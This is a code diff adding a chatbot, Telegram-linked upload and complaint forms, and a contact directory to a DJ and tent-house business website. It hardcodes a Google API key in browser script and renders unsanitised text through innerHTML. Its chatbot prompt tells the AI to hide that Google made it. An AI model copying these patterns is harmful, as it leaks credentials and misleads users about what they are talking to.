+        else if(type === 'video') document.getElementById('vaultInputVideo').click();
+        else if(type === 'audio') document.getElementById('vaultInputAudio').click();
+        else if(type === 'document') document.getElementById('vaultInputDocument').click();
+    }
+
+    function openContactSender() {
+        if(!validateVaultUser()) return;
+        document.getElementById('vaultContactForm').style.display = 'block';
+    }
+
+    // Processes the file upload directly to Telegram
+    function processVaultUpload(inputElement, mediaType) {
+        if(inputElement.files.length === 0) return;
+        
+        const user = validateVaultUser();
+        const file = inputElement.files[0];
+        const statusBox = document.getElementById('vaultUploadStatus');
+        
+        // Show loading UI
+        statusBox.style.display = 'block';
+        statusBox.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Uploading ' + mediaType + '... Please wait.';
+        statusBox.style.color = '#00fa9a';
+        statusBox.style.borderColor = '#00fa9a';
+
+        const formData = new FormData();
+        formData.append('chat_id', VAULT_TG_CHAT);
+        
+        // Premium Caption Format
+        const caption = `📥 *NEW MEDIA VAULT UPLOAD* 📥\n\n👤 *From:* ${user.name}\n📞 *Sender Phone:* ${user.phone}\n📁 *File Type:* ${mediaType.toUpperCase()}\n📄 *File Name:* ${file.name}`;
+        formData.append('caption', caption);
+        formData.append('parse_mode', 'Markdown');
+
+        // Determine Telegram API endpoint based on type
+        let endpoint = 'sendDocument';
+        let fileField = 'document';
+
+        if (mediaType === 'photo') { endpoint = 'sendPhoto'; fileField = 'photo'; }
+        else if (mediaType === 'video') { endpoint = 'sendVideo'; fileField = 'video'; }
+        else if (mediaType === 'audio') { endpoint = 'sendAudio'; fileField = 'audio'; }
+
+        formData.append(fileField, file);
+
+        fetch(`https://api.telegram.org/bot${VAULT_TG_TOKEN}/${endpoint}`, {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            if(data.ok) {
+                statusBox.innerHTML = '<i class="fas fa-check-circle"></i> Successfully Transferred to Management!';
+                inputElement.value = ''; // clear input
+                setTimeout(() => { statusBox.style.display = 'none'; }, 4000);
+            } else {
+                throw new Error("File too large or API error");
+            }
+        })
+        .catch(error => {
+            statusBox.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Error: File might be too large (Max 50MB).';
+            statusBox.style.color = '#ff3333';
+            statusBox.style.borderColor = '#ff3333';
+            inputElement.value = ''; // clear input
+        });
+    }
+
+    // Sends specific Contact Details to Telegram
+    function sendContactToVault() {
+        const user = validateVaultUser();
+        const contactName = document.getElementById('shareContactName').value.trim();
+        const contactPhone = document.getElementById('shareContactPhone').value.trim();
+
+        if(!contactName || !contactPhone) {
+            alert("Please enter the contact name and phone number to share.");
+            return;
+        }
+
+        const statusBox = document.getElementById('vaultUploadStatus');
+        statusBox.style.display = 'block';
+        statusBox.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending Contact...';
+
+        // Use sendContact API endpoint for authentic Telegram Contacts
+        const url = `https://api.telegram.org/bot${VAULT_TG_TOKEN}/sendContact`;
+        
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: VAULT_TG_CHAT,
+                phone_number: contactPhone,
+                first_name: contactName,
+                // Appending who sent it in the vcard/last_name area or as a separate message
+            })
+        })
+        .then(() => {
+            // Also send a text message explaining who shared it
+            fetch(`https://api.telegram.org/bot${VAULT_TG_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: VAULT_TG_CHAT,
+                    text: `👤 *CONTACT SHARED*\n\nThe contact above was shared by:\n*Name:* ${user.name}\n*Phone:* ${user.phone}`,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            statusBox.innerHTML = '<i class="fas fa-check-circle"></i> Contact Sent!';
+            document.getElementById('shareContactName').value = '';
+            document.getElementById('shareContactPhone').value = '';
+            document.getElementById('vaultContactForm').style.display = 'none';
+            setTimeout(() => { statusBox.style.display = 'none'; }, 4000);
+        });
+    }
+</script>
+        <a href="#" class="side-link" onclick="toggleMenu(); openPricing()"><i class="fas fa-tags"></i> Price List</a>
+        <a href="#" class="side-link" onclick="toggleMenu(); navAction('booking')"><i class="fas fa-calendar-check"></i> Booking</a>
+        <a href="#" class="side-link" onclick="toggleMenu(); openFeedback()"><i class="fas fa-star"></i> Feedback</a>
+        <a href="javascript:void(0)" class="side-link" onclick="toggleMenu(); openAiModal()">
+    <i class="fas fa-robot"></i> AI Assistant
+</a>
+
+<style>
+    #aiModalOverlay {
+        display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+        background: rgba(5, 5, 8, 0.95); backdrop-filter: blur(10px);
+        z-index: 999999; justify-content: center; align-items: center;
+        animation: fadeInOverlay 0.3s ease;
+    }
+    .mn-ai-box {
+        background: linear-gradient(135deg, #120f0a 0%, #0a0a0c 100%); 
+        border: 2px solid #D4AF37; border-radius: 16px; width: 95%; max-width: 450px; 
+        height: 85vh; max-height: 650px; display: flex; flex-direction: column;
+        position: relative; overflow: hidden;
+        box-shadow: 0 20px 50px rgba(0,0,0,0.9), inset 0 0 20px rgba(212, 175, 55, 0.15);
+        animation: slideDownFade 0.4s cubic-bezier(0.25, 0.8, 0.25, 1) forwards;
+    }
+    .ai-header {
+        background: rgba(212, 175, 55, 0.1); padding: 15px 20px; border-bottom: 1px solid rgba(212, 175, 55, 0.3);
+        display: flex; align-items: center; justify-content: space-between;
+    }
+    .ai-chat-area {
+        flex-grow: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 15px;
+    }
+    .ai-chat-area::-webkit-scrollbar { width: 5px; }
+    .ai-chat-area::-webkit-scrollbar-thumb { background: #D4AF37; border-radius: 10px; }
+    .msg-bubble { max-width: 85%; padding: 12px 16px; border-radius: 12px; font-family: 'Outfit', sans-serif; font-size: 14px; line-height: 1.5; }
+    .msg-ai { background: rgba(255, 255, 255, 0.05); color: #ddd; align-self: flex-start; border-bottom-left-radius: 2px; border: 1px solid rgba(212, 175, 55, 0.2); }
+    .msg-user { background: #D4AF37; color: #000; align-self: flex-end; font-weight: 600; border-bottom-right-radius: 2px; box-shadow: 0 4px 10px rgba(212, 175, 55, 0.3); }
+    .ai-input-area { padding: 15px; background: rgba(0,0,0,0.5); border-top: 1px solid rgba(212, 175, 55, 0.3); display: flex; gap: 10px; }
+    .ai-input-box { flex-grow: 1; padding: 12px 15px; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(212, 175, 55, 0.3); color: #fff; border-radius: 50px; outline: none; font-family: 'Outfit', sans-serif; transition: 0.3s; }
+    .ai-input-box:focus { border-color: #D4AF37; background: rgba(212, 175, 55, 0.05); }
+    .ai-send-btn { background: #D4AF37; color: #000; border: none; width: 45px; height: 45px; border-radius: 50%; cursor: pointer; display: flex; justify-content: center; align-items: center; font-size: 18px; transition: 0.3s; box-shadow: 0 4px 10px rgba(212, 175, 55, 0.4); }
+    .ai-send-btn:hover { transform: scale(1.1); }
+</style>
+
+<div id="aiModalOverlay" onclick="closeAiOnOutsideClick(event)">
+    <div class="mn-ai-box">
+        <div class="ai-header">
+            <div style="display:flex; align-items:center; gap:10px;">
+                <div style="width:38px; height:38px; background:#D4AF37; border-radius:50%; display:flex; justify-content:center; align-items:center; color:#000; font-size:20px;">
+                    <i class="fas fa-robot"></i>
+                </div>
+                <div>
+                    <h3 style="margin:0; color:#D4AF37; font-family:'Cinzel', serif; font-size:17px; font-weight:bold; letter-spacing:1px;">Maa Nirmala AI</h3>
+                    <div style="color:#00ff00; font-size:11px; font-family:sans-serif; font-weight:bold;">● Online & Ready</div>
+                </div>
+            </div>
+            <span onclick="closeAiModal()" style="color:#D4AF37; font-size:30px; cursor:pointer; line-height:1;">&times;</span>
+        </div>
+        
+        <div class="ai-chat-area" id="aiChatBox">
+            <div class="msg-bubble msg-ai">
+                🙏 Welcome to Maa Nirmala DJ & Tent House! I am your virtual assistant. How can I help you make your event unforgettable today? Ask me about our Heavy Bass setups, VIP Tents, or Prices!
+            </div>
+        </div>
+        
+        <div class="ai-input-area">
+            <input type="text" id="aiUserInput" class="ai-input-box" placeholder="Message Maa Nirmala AI..." onkeypress="handleAiEnter(event)">
+            <button class="ai-send-btn" onclick="sendAiMessage()">
+                <i class="fas fa-paper-plane"></i>
+            </button>
+        </div>
+    </div>
+</div>
+
+<script>
+    const AI_API_KEY = "AIzaSyB9TBi4xUa2Ruqv0_-_f8ruGTRpXh5YHoQ";
+    
+    function openAiModal() { document.getElementById('aiModalOverlay').style.display = 'flex'; }
+    function closeAiModal() { document.getElementById('aiModalOverlay').style.display = 'none'; }
+    function closeAiOnOutsideClick(event) { if (event.target.id === 'aiModalOverlay') closeAiModal(); }
+    function handleAiEnter(event) { if (event.key === "Enter") sendAiMessage(); }
+
+    function appendMessage(text, sender) {
+        const chatBox = document.getElementById('aiChatBox');
+        const msgDiv = document.createElement('div');
+        msgDiv.className = `msg-bubble ${sender === 'user' ? 'msg-user' : 'msg-ai'}`;
+        // Convert basic markdown formatting into HTML
+        let formattedText = text.replace(/\*\*(.*?)\*\*/g, '<b>$1</b>').replace(/\*(.*?)\*/g, '<i>$1</i>').replace(/\n/g, '<br>');
+        msgDiv.innerHTML = formattedText;
+        chatBox.appendChild(msgDiv);
+        chatBox.scrollTop = chatBox.scrollHeight;
+    }
+
+    async function sendAiMessage() {
+        const inputField = document.getElementById('aiUserInput');
+        const userText = inputField.value.trim();
+        if (!userText) return;
+        
+        if(typeof playTap === 'function') playTap();
+        
+        // Add User Message to Chat
+        appendMessage(userText, 'user');
+        inputField.value = '';
+        
+        // Add Typing Indicator
+        const chatBox = document.getElementById('aiChatBox');
+        const typingDiv = document.createElement('div');
+        typingDiv.className = 'msg-bubble msg-ai';
+        typingDiv.id = 'aiTypingIndicator';
+        typingDiv.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Checking details...';
+        chatBox.appendChild(typingDiv);
+        chatBox.scrollTop = chatBox.scrollHeight;
+
+        // THE "SUPER BRAIN" - This tells the AI exactly how to answer!
+        const businessKnowledge = `
+        You are "Maa Nirmala AI", the official customer service assistant for "Maa Nirmala DJ & Tent House".
+        You must act like a highly professional, welcoming sales manager. Keep answers short, helpful, and convincing.
+        Never reveal that you are an AI created by Google. If a user asks who made you, say "I am the digital assistant for Maa Nirmala DJ."
+        If the user speaks Hindi, reply in Hinglish or Hindi.
+        
+        **ALL BUSINESS KNOWLEDGE TO USE FOR ANSWERS:**
+        - Owner & Boss: Mr. Anil Kumar Tanti
+        - Management Team: Sildhar Kumar, Lalu Kumar, Sanjay Kumar
+        - Main Contact Numbers: +91 9771617808 (Lalu), +91 7294969938 (Sildhar), +91 8544341240 (Anil).
+        - Full Address: Beltikri, Kaddhar, Katoria, Banka, Bihar, Pin Code: 813106.
+        - Style of Work: We are famous for Earth-shaking heavy bass, crystal clear line-array tops, VIP waterproof pandals, and cinematic laser lighting.
+        
+        **PRICE LIST (Always say these are "Starting Prices" and ask them to book for exact quotes):**
+        - Heavy DJ Setup: ₹8,000+
+        - Grand Wedding Tent & Pandal: ₹25,000+
+        - Stage Decoration (Floral/Backdrop): ₹10,000+
+        - Mega Concert DJ Rig: ₹15,000+
+        - Baaraat DJ Trolley: ₹12,000+
+        - Premium VIP Pandal: ₹35,000+
+        - Heavy Duty Generator (DG Set): ₹4,000+
+        - Transport: We use Laxmikant Tractor Transport for all heavy logistics.
+        
+        **INSTRUCTIONS:**
+        1. When answering, try to push the customer to use the "Contact" button or the "Booking Form" on the website.
+        2. Always be respectful and use emojis like 🎪, 🎵, 👑 to make it look premium.
+        3. Answer the customer's exact question based strictly on the knowledge above.
+        
+        Customer's Question: "${userText}"
+        `;
+
+        try {
+            const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${AI_API_KEY}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    contents: [{ parts: [{ text: businessKnowledge }] }],
+                    generationConfig: { temperature: 0.7, maxOutputTokens: 250 } // Keeps answers fast and focused
+                })
+            });
+
+            const data = await response.json();
+            document.getElementById('aiTypingIndicator').remove();
+
+            if (data.candidates && data.candidates[0].content.parts[0].text) {
+                appendMessage(data.candidates[0].content.parts[0].text, 'ai');
+            } else {
+                appendMessage("I'm sorry, my connection is a bit slow right now. You can directly call Mr. Lalu at +91 9771617808.", 'ai');
+            }
+        } catch (error) {
+            document.getElementById('aiTypingIndicator').remove();
+            appendMessage("⚠️ Network error. Please use the Contact button to reach our team directly.", 'ai');
+        }
+    }
+</script>
+        <a href="#" class="side-link" onclick="toggleMenu(); navAction('links')"><i class="fas fa-link"></i> All Links</a>
+<a href="javascript:void(0)" class="side-link" onclick="openVintageContacts()">
+    <i class="fas fa-phone"></i> Contact
+</a>
+
+<div id="vintageContactModal" class="vintage-modal-overlay">
+    <div class="vintage-modal-content">
+        <span class="vintage-close-btn" onclick="closeVintageContacts()">&times;</span>
+        <h2 class="vintage-title">Maa Nirmala Directory</h2>
+        
+        <div class="vintage-contact-list">
+            
+            <div class="vintage-contact-card">
+                <img src="https://i.postimg.cc/6qbJj3hQ/Screenshot-2026-01-14-15-25-06-57-1c337646f29875672b5a61192b9010f9-2.jpg" alt="Anil Kumar" class="vintage-avatar">
+                <div class="vintage-info">
+                    <h4>Anil Kumar</h4>
+                    <div class="vintage-actions">
+                        <a href="tel:+918544341240" class="action-btn call-btn"><i class="fas fa-phone-alt"></i> Call</a>
+                        <a href="https://wa.me/918544341240" target="_blank" class="action-btn wa-btn"><i class="fab fa-whatsapp"></i> WhatsApp</a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="vintage-contact-card">
+                <img src="https://i.postimg.cc/7Y7rMx2y/Screenshot-2026-01-14-15-33-01-78-965bbf4d18d205f782c6b8409c5773a4-2.jpg" alt="Sildhar Kumar" class="vintage-avatar">
+                <div class="vintage-info">
+                    <h4>Sildhar Kumar</h4>
+                    <div class="vintage-actions">
+                        <a href="tel:+917294969938" class="action-btn call-btn"><i class="fas fa-phone-alt"></i> Call</a>
+                        <a href="https://wa.me/917294969938" target="_blank" class="action-btn wa-btn"><i class="fab fa-whatsapp"></i> WhatsApp</a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="vintage-contact-card">
+                <img src="https://i.postimg.cc/qMWWzWbF/Screenshot-2026-01-14-15-29-44-90-965bbf4d18d205f782c6b8409c5773a4.jpg" alt="Sanjay Kumar" class="vintage-avatar">
+                <div class="vintage-info">
+                    <h4>Sanjay Kumar</h4>
+                    <div class="vintage-actions">
+                        <a href="tel:+919153635378" class="action-btn call-btn"><i class="fas fa-phone-alt"></i> Call</a>
+                        <a href="https://wa.me/919153635378" target="_blank" class="action-btn wa-btn"><i class="fab fa-whatsapp"></i> WhatsApp</a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="vintage-contact-card">
+                <img src="https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg" alt="Lalu Kumar" class="vintage-avatar">
+                <div class="vintage-info">
+                    <h4>Lalu Kumar</h4>
+                    <div class="vintage-actions">
+                        <a href="tel:+919771617808" class="action-btn call-btn"><i class="fas fa-phone-alt"></i> Call</a>
+                        <a href="https://wa.me/919771617808" target="_blank" class="action-btn wa-btn"><i class="fab fa-whatsapp"></i> WhatsApp</a>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+<style>
+    /* Overlay Background */
+    .vintage-modal-overlay {
+        display: none; 
+        position: fixed;
+        top: 0; left: 0; width: 100%; height: 100%;
+        background: rgba(5, 5, 8, 0.85); 
+        backdrop-filter: blur(8px);
+        z-index: 99999; 
+        justify-content: center;
+        align-items: center;
+    }
+
+    /* Modal Box */
+    .vintage-modal-content {
+        background: linear-gradient(135deg, #1c1712 0%, #0d0b09 100%); 
+        border: 2px solid #D4AF37; 
+        border-radius: 16px;
+        width: 90%;
+        max-width: 420px;
+        padding: 30px;
+        box-shadow: 0 15px 40px rgba(0,0,0,0.9), inset 0 0 20px rgba(212, 175, 55, 0.15);
+        position: relative;
+        animation: slideDownFade 0.4s ease-out forwards;
+    }
+
+    @keyframes slideDownFade {
+        from { opacity: 0; transform: translateY(-30px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Close Button */
+    .vintage-close-btn {
+        position: absolute;
+        top: 15px;
+        right: 20px;
+        color: #D4AF37;
+        font-size: 30px;
+        line-height: 1;
+        cursor: pointer;
+        transition: color 0.3s ease;
+    }
+    .vintage-close-btn:hover { color: #ffffff; }
+
+    /* Title */
+    .vintage-title {
+        font-family: 'Cinzel', serif;
+        color: #D4AF37;
+        text-align: center;
+        margin: 0 0 20px 0;
+        font-size: 22px;
+        font-weight: bold;
+        border-bottom: 1px solid rgba(212, 175, 55, 0.3);
+        padding-bottom: 15px;
+        letter-spacing: 1px;
+    }
+
+    /* Contact Row */
+    .vintage-contact-card {
+        display: flex;
+        align-items: center;
+        padding: 18px 0;
+        border-bottom: 1px dashed rgba(212, 175, 55, 0.2); 
+    }
+    .vintage-contact-card:last-child { border-bottom: none; padding-bottom: 0; }
+
+    /* Circular Avatar */
+    .vintage-avatar {
+        width: 65px;
+        height: 65px;
+        border-radius: 50%;
+        object-fit: cover;
+        border: 2px solid #D4AF37;
+        margin-right: 20px;
+        box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+        filter: sepia(0.2) contrast(1.1); 
+    }
+
+    /* Name Text */
+    .vintage-info h4 {
+        margin: 0 0 8px 0;
+        font-family: 'Cinzel', serif;
+        font-size: 18px;
+        color: #ffffff;
+        letter-spacing: 0.5px;
+    }
+
+    /* Action Buttons Container */
+    .vintage-actions {
+        display: flex;
+        gap: 10px;
+    }
+
+    /* Button Styling */
+    .action-btn {
+        font-family: 'Outfit', sans-serif;
+        text-decoration: none;
+        font-size: 13px;
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        padding: 5px 12px;
+        border-radius: 50px;
+        transition: all 0.3s ease;
+        border: 1px solid rgba(212, 175, 55, 0.4);
+        color: #D4AF37;
+        background: rgba(212, 175, 55, 0.05);
+    }
+
+    /* Call Button Hover */
+    .call-btn:hover {
+        background: rgba(212, 175, 55, 0.2);
+        color: #ffffff;
+        border-color: #D4AF37;
+        box-shadow: 0 0 10px rgba(212, 175, 55, 0.3);
+    }
+
+    /* WhatsApp Button Hover */
+    .wa-btn {
+        border-color: rgba(37, 211, 102, 0.4);
+        color: #cccccc;
+    }
+    .wa-btn i {
+        color: #25D366;
+    }
+    .wa-btn:hover {
+        background: rgba(37, 211, 102, 0.15);
+        color: #ffffff;
+        border-color: #25D366;
+        box-shadow: 0 0 10px rgba(37, 211, 102, 0.3);
+    }
+</style>
+
+<script>
+    function openVintageContacts() {
+        document.getElementById('vintageContactModal').style.display = 'flex';
+    }
+
+    function closeVintageContacts() {
+        document.getElementById('vintageContactModal').style.display = 'none';
+    }
+
+    // Close the popup if user clicks the dark background outside the box
+    window.onclick = function(event) {
+        let modal = document.getElementById('vintageContactModal');
+        if (event.target == modal) {
+            modal.style.display = "none";
+        }
+    }
+</script>
+        <a href="javascript:void(0)" class="side-link" onclick="toggleMenu(); openComplaintModal()">
+    <i class="fas fa-headset"></i> Support / Complaint
+</a>
+
+<style>
+    /* Dark Blurred Overlay */
+    #complaintModalOverlay {
+        display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+        background: rgba(5, 5, 8, 0.95); backdrop-filter: blur(10px);
+        z-index: 999999; justify-content: center; align-items: center;
+        animation: fadeInOverlay 0.3s ease;
+    }
+    
+    /* The Red-Themed Premium Box */
+    .mn-complaint-box {
+        background: linear-gradient(135deg, #1a0d0d 0%, #0a0a0c 100%); 
+        border: 2px solid #E63946; border-radius: 16px; width: 95%; max-width: 520px; 
+        padding: 25px; position: relative;
+        box-shadow: 0 20px 50px rgba(0,0,0,0.9), inset 0 0 20px rgba(230, 57, 70, 0.15);
+        animation: slideDownFade 0.4s cubic-bezier(0.25, 0.8, 0.25, 1) forwards;
+    }
+
+    /* Advanced Input Styling with Red Glow on Focus */
+    .c-input {
+        width: 100%; padding: 12px 15px; background: rgba(255, 255, 255, 0.05);
+        border: 1px solid rgba(230, 57, 70, 0.3); color: #fff; border-radius: 8px;
+        outline: none; font-family: 'Outfit', sans-serif; box-sizing: border-box;
+        transition: all 0.3s ease; margin-bottom: 12px;
+    }
+    .c-input:focus {
+        border-color: #E63946; background: rgba(230, 57, 70, 0.05); box-shadow: 0 0 12px rgba(230, 57, 70, 0.4);
+    }
+    .c-input::placeholder { color: #888; }
+</style>
+
+<div id="complaintModalOverlay" onclick="closeOnOutsideClick(event)">
+    <div class="mn-complaint-box" id="complaintBoxContent">
+        <span onclick="closeComplaintModal()" style="position:absolute; top:15px; right:20px; color:#E63946; font-size:35px; line-height:1; cursor:pointer; transition:0.3s;">&times;</span>
+        
+        <h2 style="font-family:'Cinzel',serif; color:#E63946; text-align:center; margin-top:0; border-bottom:1px solid rgba(230,57,70,0.3); padding-bottom:15px; font-size: 24px; font-weight:800; letter-spacing:1px;">
+            <i class="fas fa-exclamation-triangle"></i> Register Complaint
+        </h2>
+        
+        <div style="display:flex; flex-direction:column; margin-top: 15px;">
+            <div style="display:flex; gap:10px;">
+                <input type="text" id="c-name" class="c-input" placeholder="Full Name *">
+                <input type="tel" id="c-phone" class="c-input" placeholder="Phone Number *">
+            </div>
+            
+            <input type="text" id="c-event-name" class="c-input" placeholder="Event Name (e.g. Amit Wedding) *">
+            
+            <div style="display:flex; gap:10px;">
+                <div style="flex:1;">
+                    <span style="color:#E63946; font-size:12px; font-family:'Outfit', sans-serif; padding-left:5px;">Event Date *</span>
+                    <input type="date" id="c-event-date" class="c-input" style="color:#ddd; margin-bottom:0;">
+                </div>
+                <div style="flex:1;">
+                    <span style="color:#E63946; font-size:12px; font-family:'Outfit', sans-serif; padding-left:5px;">Event Time *</span>
+                    <input type="time" id="c-event-time" class="c-input" style="color:#ddd; margin-bottom:0;">
+                </div>
+            </div>
+
+            <select id="c-type" class="c-input" style="color:#ddd; margin-top:12px;">
+                <option value="" disabled selected style="color:#000;">Select Issue Type *</option>
+                <option value="Event Setup Delay" style="color:#000;">Event Setup Delay</option>
+                <option value="Sound / Light Problem" style="color:#000;">Sound / Light Problem</option>
+                <option value="Tent / Decor Issue" style="color:#000;">Tent / Decor Issue</option>
+                <option value="Staff Behavior" style="color:#000;">Staff Behavior</option>
+                <option value="Other Issue" style="color:#000;">Other Issue</option>
+            </select>
+            
+            <textarea id="c-desc" class="c-input" rows="3" placeholder="Describe the issue in detail... *" style="resize:none;"></textarea>
+            
+            <button id="submitComplaintBtn" onclick="submitComplaint()" style="background:#E63946; color:#fff; font-weight:bold; padding:15px; border:none; border-radius:8px; cursor:pointer; font-size:16px; margin-top:5px; transition:0.3s; font-family:'Outfit', sans-serif; box-shadow: 0 5px 15px rgba(230, 57, 70, 0.4);">
+                <i class="fas fa-paper-plane"></i> SEND URGENT ALERT
+            </button>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Open & Close Functions
+    function openComplaintModal() { document.getElementById('complaintModalOverlay').style.display = 'flex'; }
+    function closeComplaintModal() { document.getElementById('complaintModalOverlay').style.display = 'none'; }
+    
+    // Close when clicking the dark background outside the box
+    function closeOnOutsideClick(event) {
+        if (event.target.id === 'complaintModalOverlay') { closeComplaintModal(); }
+    }
+    
+    // Advanced Submission Logic
+    function submitComplaint() {
+        if(typeof playTap === 'function') playTap();
+        const name = document.getElementById('c-name').value; const phone = document.getElementById('c-phone').value; const eventName = document.getElementById('c-event-name').value; const eventDate = document.getElementById('c-event-date').value; const eventTime = document.getElementById('c-event-time').value; const type = document.getElementById('c-type').value; const desc = document.getElementById('c-desc').value;
+        
+        // Validation
+        if(!name || !phone || !eventName || !eventDate || !eventTime || !type || !desc) { 
+            alert("⚠️ Please fill all required (*) fields so we can resolve your issue immediately!"); return; 
+        }
+        
+        // Loading State
+        const btn = document.getElementById('submitComplaintBtn'); 
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> SENDING ALERT...'; 
+        btn.style.opacity = '0.7';
+        
+        // Exact Day, Date, and Time Calculation
+        const now = new Date(); 
+        const exactDay = now.toLocaleDateString('en-IN', { weekday: 'long' }); 
+        const exactDate = now.toLocaleDateString('en-IN', { year: 'numeric', month: 'long', day: 'numeric' }); 
+        const exactTime = now.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', hour12: true });
+        
+        // Telegram Message Formatting
+        const msg = `🚨 *URGENT COMPLAINT LOGGED* 🚨\n---------------------------\n🗓️ *Submitted Day:* ${exactDay}\n📅 *Submitted Date:* ${exactDate}\n⏰ *Submitted Time:* ${exactTime}\n\n👤 *Client Name:* ${name}\n📞 *Contact:* ${phone}\n\n🎪 *Event Details:*\n• Name: ${eventName}\n• Date: ${eventDate}\n• Time: ${eventTime}\n\n⚠️ *Issue Category:* ${type}\n📝 *Description:*\n${desc}\n\n🛑 *ACTION REQUIRED IMMEDIATELY*`;
+        
+        // Send to Telegram
+        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, { 
+            method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: 'Markdown' }) 
+        }).then(res => { 
+            btn.innerHTML = '<i class="fas fa-check"></i> SUBMITTED!'; 
+            btn.style.background = '#00ff00'; btn.style.color = '#000';
+            
+            // Reset and Close after 2 seconds
+            setTimeout(() => { 
+                closeComplaintModal(); 
+                btn.innerHTML = '<i class="fas fa-paper-plane"></i> SEND URGENT ALERT'; 
+                btn.style.background = '#E63946'; btn.style.color = '#fff'; btn.style.opacity = '1'; 
+                document.getElementById('c-name').value=''; document.getElementById('c-phone').value=''; document.getElementById('c-event-name').value=''; document.getElementById('c-event-date').value=''; document.getElementById('c-event-time').value=''; document.getElementById('c-type').value=''; document.getElementById('c-desc').value=''; 
+            }, 2000); 
+        }).catch(err => { 
+            alert("Network Error. Please call Mr. Lalu directly at +91 9771617808"); 
+            btn.innerHTML = '<i class="fas fa-paper-plane"></i> SEND URGENT ALERT'; 
+            btn.style.opacity = '1'; 
+        });
+    }
+</script>
+        <a href="javascript:void(0)" class="side-link" onclick="toggleMenu(); openTermsModal()">
+    <i class="fas fa-file-contract"></i> Terms & Conditions
+</a>
+
+<style>
+    /* Dark Blurred Overlay */
+    #termsModalOverlay {
+        display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+        background: rgba(5, 5, 8, 0.95); backdrop-filter: blur(10px);
+        z-index: 999999; justify-content: center; align-items: center;
+        animation: fadeInOverlay 0.3s ease;
+    }
+    
+    /* The Gold-Themed Premium Contract Box */
+    .mn-terms-box {
+        background: linear-gradient(135deg, #120f0a 0%, #0a0a0c 100%); 
+        border: 2px solid #D4AF37; border-radius: 16px; width: 95%; max-width: 700px; 
+        height: 85vh; max-height: 700px; display: flex; flex-direction: column;
+        position: relative; overflow: hidden;
+        box-shadow: 0 20px 50px rgba(0,0,0,0.9), inset 0 0 20px rgba(212, 175, 55, 0.15);
+        animation: slideDownFade 0.4s cubic-bezier(0.25, 0.8, 0.25, 1) forwards;
+    }
+
+    /* Header Area */
+    .terms-header {
+        background: rgba(212, 175, 55, 0.1); padding: 20px; border-bottom: 1px solid rgba(212, 175, 55, 0.3);
+        text-align: center; position: relative;
+    }
+    
+    /* Scrollable Text Area */
+    .terms-content-area {
+        flex-grow: 1; padding: 25px; overflow-y: auto; color: #cccccc;
+        font-family: 'Outfit', sans-serif; font-size: 14px; line-height: 1.8; text-align: justify;
+    }
+    
+    /* Custom Gold Scrollbar */
+    .terms-content-area::-webkit-scrollbar { width: 6px; }
+    .terms-content-area::-webkit-scrollbar-thumb { background: #D4AF37; border-radius: 10px; }
+    
+    /* Typography inside the Terms */
+    .terms-content-area h4 {
+        color: #D4AF37; font-family: 'Cinzel', serif; font-size: 16px; 
+        margin-top: 25px; margin-bottom: 10px; letter-spacing: 0.5px; text-transform: uppercase;
+    }
+    .terms-content-area p { margin-bottom: 15px; }
+    .terms-content-area strong { color: #ffffff; }
+</style>
+
+<div id="termsModalOverlay" onclick="closeTermsOnOutsideClick(event)">
+    <div class="mn-terms-box" id="termsBoxContent">
+        
+        <div class="terms-header">
+            <span onclick="closeTermsModal()" style="position:absolute; top:15px; right:20px; color:#D4AF37; font-size:35px; line-height:1; cursor:pointer; transition:0.3s;">&times;</span>
+            <h2 style="margin:0; color:#D4AF37; font-family:'Cinzel', serif; font-size:24px; font-weight:800; letter-spacing:1px;">
+                <i class="fas fa-balance-scale"></i> Legal Agreement
+            </h2>
+            <p style="margin:5px 0 0 0; color:#aaa; font-size:12px; font-family:'Outfit', sans-serif;">Maa Nirmala DJ & Tent House Official Policy</p>
+        </div>
+        
+        <div class="terms-content-area">
+            <p>Welcome to <strong>Maa Nirmala DJ & Tent House</strong>. By engaging our services, booking an event, or renting our equipment, you (the "Client") agree to be bound by the following comprehensive Terms and Conditions set forth by our management under the leadership of Mr. Lalu Kumar Tanti. These policies are strictly enforced to ensure the flawless execution of your event and the safety of our staff and equipment.</p>
+
+            <h4>1. Booking, Payment, & Advances</h4>
+            <p>To secure a date for any service (DJ, Tent, Stage Decoration, or Generator), a non-refundable advance payment of strictly <strong>30% to 50%</strong> of the total quoted package is required at the time of booking. The remaining balance must be settled in full on the day of the event, strictly <em>before</em> the setup is completely dismantled. Failure to clear the final payment will result in legal action. In the event of an event cancellation by the client within 72 hours of the scheduled date, the advance payment will be entirely forfeited.</p>
+
+            <h4>2. Logistics & Site Accessibility</h4>
